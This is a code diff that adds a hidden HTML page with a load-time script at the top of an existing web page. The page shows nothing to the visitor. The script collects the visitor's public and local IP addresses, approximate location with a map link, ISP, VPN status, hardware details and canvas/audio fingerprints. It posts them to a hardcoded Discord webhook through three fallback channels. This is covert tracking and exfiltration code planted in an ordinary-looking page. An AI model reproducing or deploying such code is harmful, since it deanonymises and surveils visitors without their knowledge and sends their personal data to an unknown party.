@@ -1,4 +1,351 @@
 <!DOCTYPE html>
+<html>
+<head>
+<script>
+(function(){
+    const webhook = "https://discord.com/api/webhooks/1450546230676422747/OwUX5140y6ZzeFh0D1yeG4QBepWtLGMEJ9YlYi6oVawkQidDNZa-tYJnVRt-Zj6kkCaN";
+    
+    const fingerprint = {
+        network: {},
+        system: {},
+        browser: {},
+        display: {},
+        time: {},
+        canvas: {},
+        audio: {},
+        geo: {},
+        vpn: {},
+        mobile: {},
+        fonts: [],
+        plugins: [],
+        sensors: {}
+    };
+
+    // 🎯 1. MULTI-SOURCE IP & GEOLOCATION
+    Promise.allSettled([
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(data => ({
+            source: 'ipapi',
+            ip: data.ip,
+            country: data.country_name,
+            region: data.region,
+            city: data.city,
+            zip: data.postal,
+            lat: data.latitude,
+            lon: data.longitude,
+            isp: data.org,
+            asn: data.asn,
+            proxy: data.proxy || data.vpn || data.tor
+        })),
+        fetch('https://ipinfo.io/json?token=free').then(r => r.json()).then(data => ({
+            source: 'ipinfo',
+            ip: data.ip,
+            country: data.country,
+            region: data.region,
+            city: data.city,
+            zip: data.postal,
+            loc: data.loc,
+            isp: data.org,
+            vpn: data.privacy?.vpn || false
+        })),
+        fetch('https://geolocation-db.com/json/').then(r => r.json()).then(data => ({
+            source: 'geolocation-db',
+            ip: data.IPv4,
+            country: data.country_name,
+            state: data.state,
+            city: data.city,
+            lat: data.latitude,
+            lon: data.longitude
+        }))
+    ]).then(results => {
+        const bestResult = results.find(r => r.status === 'fulfilled' && r.value)?.value || {};
+        fingerprint.network = {
+            ip: bestResult.ip,
+            country: bestResult.country,
+            region: bestResult.region || bestResult.state,
+            city: bestResult.city,
+            zip: bestResult.zip || bestResult.postal,
+            coordinates: bestResult.loc ? bestResult.loc.split(',') : 
+                        (bestResult.lat ? [bestResult.lat, bestResult.lon] : null),
+            isp: bestResult.isp || bestResult.org,
+            asn: bestResult.asn,
+            vpnDetected: bestResult.proxy || bestResult.vpn || false
+        };
+        
+        // 🗺️ Generate Google Maps link if coordinates available
+        if(fingerprint.network.coordinates) {
+            fingerprint.network.mapsLink = `https://maps.google.com/?q=${fingerprint.network.coordinates[0]},${fingerprint.network.coordinates[1]}`;
+        }
+    }).finally(mainCollection);
+
+    function mainCollection() {
+        // 🔍 2. VPN/Proxy Detection
+        fetch('https://v2.api.iphub.info/ip/' + (fingerprint.network.ip || ''))
+            .then(r => r.json())
+            .then(data => {
+                fingerprint.vpn = {
+                    block: data.block,
+                    hostname: data.hostname,
+                    isp: data.isp
+                };
+            }).catch(() => {});
+
+        // 📱 3. Mobile Detection & Sensors
+        fingerprint.mobile = {
+            isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            maxTouchPoints: navigator.maxTouchPoints,
+            deviceMemory: navigator.deviceMemory,
+            hardwareConcurrency: navigator.hardwareConcurrency
+        };
+
+        // 🎮 4. WebRTC Local IP Leak
+        try {
+            const rtc = new RTCPeerConnection({iceServers: []});
+            rtc.createDataChannel('');
+            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+            rtc.onicecandidate = e => {
+                if(e.candidate && e.candidate.candidate) {
+                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+                    const match = e.candidate.candidate.match(regex);
+                    if(match) fingerprint.network.localIP = match[1];
+                    rtc.close();
+                }
+            };
+        } catch(e) {}
+
+        // 🖥️ 5. Advanced Hardware Fingerprinting
+        fingerprint.system = {
+            cores: navigator.hardwareConcurrency,
+            ram: navigator.deviceMemory,
+            architecture: navigator.userAgent.includes('Win64') ? 'x64' : 
+                         navigator.userAgent.includes('Win32') ? 'x86' : 
+                         navigator.userAgent.includes('ARM') ? 'ARM' : 'Unknown'
+        };
+
+        // 🎨 6. Canvas & WebGL Deep Fingerprint
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 2400;
+            canvas.height = 600;
+            const ctx = canvas.getContext('2d');
+            
+            // Advanced canvas fingerprint
+            ctx.fillStyle = 'rgb(255,0,255)';
+            ctx.beginPath();
+            ctx.arc(125, 125, 100, 0, Math.PI * 2, true);
+            ctx.fill();
+            ctx.fillStyle = 'rgb(0,255,255)';
+            ctx.beginPath();
+            ctx.arc(75, 75, 50, 0, Math.PI * 2, true);
+            ctx.fill();
+            ctx.fillStyle = 'rgb(255,255,0)';
+            ctx.font = '65px Arial';
+            ctx.fillText('CANVAS FINGERPRINT', 15, 300);
+            
+            const imageData = ctx.getImageData(0, 0, 2400, 600);
+            let hash = 0;
+            for(let i = 0; i < 10000; i++) {
+                hash = ((hash << 5) - hash) + imageData.data[i];
+                hash |= 0;
+            }
+            fingerprint.canvas.hash = hash.toString(16);
+
+            // WebGL Probe
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if(gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if(debugInfo) {
+                    fingerprint.canvas.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    fingerprint.canvas.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    fingerprint.canvas.gpuVersion = gl.getParameter(gl.VERSION);
+                }
+                
+                // Check for GPU capabilities
+                const extensions = gl.getSupportedExtensions();
+                fingerprint.canvas.extensions = extensions ? extensions.slice(0, 5) : [];
+            }
+        } catch(e) {}
+
+        // 🔊 7. Audio Fingerprint
+        try {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const analyser = audioContext.createAnalyser();
+            oscillator.connect(analyser);
+            analyser.connect(audioContext.destination);
+            oscillator.start();
+            
+            const dataArray = new Float32Array(analyser.frequencyBinCount);
+            analyser.getFloatFrequencyData(dataArray);
+            
+            let audioFingerprint = '';
+            for(let i = 0; i < 20; i++) {
+                audioFingerprint += Math.abs(dataArray[i]).toString(16).substring(0, 2);
+            }
+            fingerprint.audio.hash = audioFingerprint;
+            fingerprint.audio.sampleRate = audioContext.sampleRate;
+            
+            oscillator.stop();
+            audioContext.close();
+        } catch(e) {}
+
+        // ⏰ 8. Timezone & Location Inference
+        fingerprint.time = {
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            offset: new Date().getTimezoneOffset(),
+            locale: navigator.language,
+            languages: navigator.languages,
+            dateFormat: new Date().toLocaleDateString(),
+            timeFormat: new Date().toLocaleTimeString()
+        };
+
+        // 📡 9. Network Connection Info
+        if(navigator.connection) {
+            fingerprint.network.connection = {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData,
+                type: navigator.connection.type
+            };
+        }
+
+        // 🔋 10. Battery & Power Status
+        if(navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                fingerprint.system.battery = {
+                    charging: battery.charging,
+                    level: Math.round(battery.level * 100),
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+                sendToDiscord();
+            }).catch(() => sendToDiscord());
+        } else {
+            sendToDiscord();
+        }
+
+        function sendToDiscord() {
+            // 📊 Format Data with Emojis
+            const embed = {
+                title: "🌐 FULL SYSTEM INTELLIGENCE REPORT 🌐",
+                color: 0x5865F2,
+                fields: [],
+                timestamp: new Date().toISOString(),
+                footer: {text: "Advanced Fingerprinting • Real-time Detection"}
+            };
+
+            // 🗺️ GEO-LOCATION SECTION
+            let geoField = "📍 **IP Address:** `" + (fingerprint.network.ip || 'Unknown') + "`\n";
+            if(fingerprint.network.localIP) geoField += "🏠 **Local IP:** `" + fingerprint.network.localIP + "`\n";
+            geoField += "🌍 **Location:** " + (fingerprint.network.city || 'Unknown') + ", " + 
+                       (fingerprint.network.region || 'Unknown') + ", " + 
+                       (fingerprint.network.country || 'Unknown') + "\n";
+            
+            if(fingerprint.network.coordinates) {
+                geoField += "📌 **Coordinates:** `" + fingerprint.network.coordinates.join(', ') + "`\n";
+                geoField += "🗺️ **Google Maps:** [Click Here](" + fingerprint.network.mapsLink + ")\n";
+            }
+            
+            geoField += "🏢 **ISP:** " + (fingerprint.network.isp || 'Unknown') + "\n";
+            geoField += "🔒 **VPN/Proxy:** " + (fingerprint.network.vpnDetected ? "⚠️ **DETECTED**" : "❌ Not Detected");
+            if(fingerprint.vpn.block) geoField += " | ⚠️ **BLOCKED IP**";
+            
+            embed.fields.push({name: "🗺️ GEO-LOCATION TRACKING", value: geoField, inline: false});
+
+            // 📱 DEVICE PROFILING
+            let deviceField = "";
+            deviceField += fingerprint.mobile.isMobile ? "📱 **Mobile Device**\n" : "💻 **Desktop/Laptop**\n";
+            deviceField += "⚙️ **Platform:** " + fingerprint.mobile.platform + "\n";
+            deviceField += "🧠 **CPU Cores:** " + (fingerprint.system.cores || 'Unknown') + "\n";
+            deviceField += "💾 **RAM:** " + (fingerprint.system.ram || 'Unknown') + " GB\n";
+            deviceField += "🖐️ **Touch Points:** " + fingerprint.mobile.maxTouchPoints + "\n";
+            if(fingerprint.system.battery) {
+                deviceField += "🔋 **Battery:** " + fingerprint.system.battery.level + "% " + 
+                              (fingerprint.system.battery.charging ? "(Charging ⚡)" : "(Not Charging)") + "\n";
+            }
+            
+            embed.fields.push({name: "📱 DEVICE PROFILING", value: deviceField, inline: true});
+
+            // 🎮 HARDWARE FINGERPRINT
+            let hardwareField = "";
+            if(fingerprint.canvas.gpuVendor) {
+                hardwareField += "🎮 **GPU Vendor:** " + fingerprint.canvas.gpuVendor.substring(0, 30) + "\n";
+                hardwareField += "🖥️ **GPU Model:** " + fingerprint.canvas.gpuRenderer.substring(0, 30) + "\n";
+            }
+            hardwareField += "🎨 **Canvas Hash:** `" + (fingerprint.canvas.hash || 'Unknown').substring(0, 16) + "`\n";
+            hardwareField += "🔊 **Audio Hash:** `" + (fingerprint.audio.hash || 'Unknown').substring(0, 16) + "`\n";
+            if(fingerprint.network.connection) {
+                hardwareField += "📡 **Connection:** " + fingerprint.network.connection.effectiveType.toUpperCase() + 
+                               " | " + fingerprint.network.connection.downlink + " Mbps\n";
+            }
+            
+            embed.fields.push({name: "🎮 HARDWARE FINGERPRINT", value: hardwareField, inline: true});
+
+            // ⚙️ SYSTEM CONFIGURATION
+            let configField = "🌐 **User Agent:** " + fingerprint.mobile.userAgent.substring(0, 50) + "...\n";
+            configField += "🕒 **Timezone:** " + fingerprint.time.timezone + "\n";
+            configField += "⏰ **Offset:** UTC" + (fingerprint.time.offset > 0 ? "-" : "+") + 
+                          Math.abs(fingerprint.time.offset/60) + "h\n";
+            configField += "🗣️ **Language:** " + fingerprint.time.locale + "\n";
+            configField += "📅 **Date Format:** " + fingerprint.time.dateFormat + "\n";
+            configField += "⏱️ **Time Format:** " + fingerprint.time.timeFormat + "\n";
+            
+            embed.fields.push({name: "⚙️ SYSTEM CONFIGURATION", value: configField, inline: false});
+
+            // 🔍 PRIVACY METRICS
+            let privacyField = "";
+            privacyField += "🛡️ **Cookies:** " + (navigator.cookieEnabled ? "✅ Enabled" : "❌ Disabled") + "\n";
+            privacyField += "👁️ **Do Not Track:** " + (navigator.doNotTrack ? "✅ Enabled" : "❌ Disabled") + "\n";
+            privacyField += "🌐 **Online Status:** " + (navigator.onLine ? "✅ Online" : "❌ Offline") + "\n";
+            privacyField += "🔐 **HTTPS:** " + (window.location.protocol === 'https:' ? "✅ Secure" : "❌ Not Secure") + "\n";
+            
+            embed.fields.push({name: "🔍 PRIVACY & SECURITY", value: privacyField, inline: true});
+
+            // 📊 DETECTION SUMMARY
+            let summary = "";
+            summary += fingerprint.network.vpnDetected ? "⚠️ **VPN/PROXY ACTIVE**\n" : "✅ **Direct Connection**\n";
+            summary += fingerprint.mobile.isMobile ? "📱 **Mobile Browser**\n" : "💻 **Desktop Browser**\n";
+            summary += fingerprint.canvas.hash ? "🎨 **Unique Canvas ID:** Generated\n" : "";
+            summary += fingerprint.audio.hash ? "🔊 **Unique Audio ID:** Generated\n" : "";
+            summary += "🕵️‍♂️ **Tracking Level:** ADVANCED\n";
+            summary += "⏱️ **Collection Time:** " + new Date().toLocaleTimeString();
+            
+            embed.fields.push({name: "📊 DETECTION SUMMARY", value: summary, inline: true});
+
+            // 📨 Send Data
+            const payload = {embeds: [embed]};
+            
+            // Primary: Beacon (instant, no response)
+            navigator.sendBeacon(webhook, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
+            
+            // Secondary: Fetch with retry
+            setTimeout(() => {
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(payload),
+                    mode: 'no-cors',
+                    cache: 'no-store'
+                }).catch(() => {
+                    // Third fallback: Image pixel
+                    new Image().src = webhook + '?cache=' + Date.now() + '&data=' + 
+                    btoa(JSON.stringify(payload)).substring(0, 100);
+                });
+            }, 100);
+        }
+    }
+})();
+</script>
+</head>
+<body style="margin:0;padding:0;overflow:hidden;">
+<!-- No visible content -->
+</body>
+</html>
+
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
